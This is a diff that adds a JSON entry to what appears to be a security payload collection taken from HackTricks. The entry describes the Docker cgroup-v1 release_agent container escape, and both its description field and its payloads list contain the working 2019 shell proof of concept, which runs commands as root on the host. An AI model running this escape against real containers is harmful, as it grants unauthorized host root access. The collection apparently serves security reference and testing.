@@ -1,0 +1,27 @@
+{
+  "id": "linux_hardening_4f645497f79b",
+  "category": "linux-hardening",
+  "title": "docker release agent cgroups escape",
+  "description": "# Docker release_agent cgroups escape\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:\n\n---\n\n## Classic PoC (2019)\n\n```shell\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin",
+  "payloads": [
+    "# Docker release_agent cgroups escape",
+    "{{#include ../../../../banners/hacktricks-training.md}}",
+    "**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:",
+    "## Classic PoC (2019)",
+    "```shell",
+    "d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`",
+    "mkdir -p $d/w;echo 1 >$d/w/notify_on_release",
+    "t=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`",
+    "touch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh",
+    "$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o",
+    "The PoC abuses the **cgroup-v1** `release_agent` feature: when the last task of a cgroup that has `notify_on_release=1` exits, the kernel (in the **initial namespaces on the host**) executes the program whose pathname is stored in the writable file `release_agent`.  Because that execution happens with **full root privileges on the host**, gaining write access to the file is enough for a container escape.",
+    "### Short, readable walk-through",
+    "1. **Prepare a new cgroup**",
+    "```shell",
+    "mkdir /tmp/cgrp"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.md"
+  ]
+}
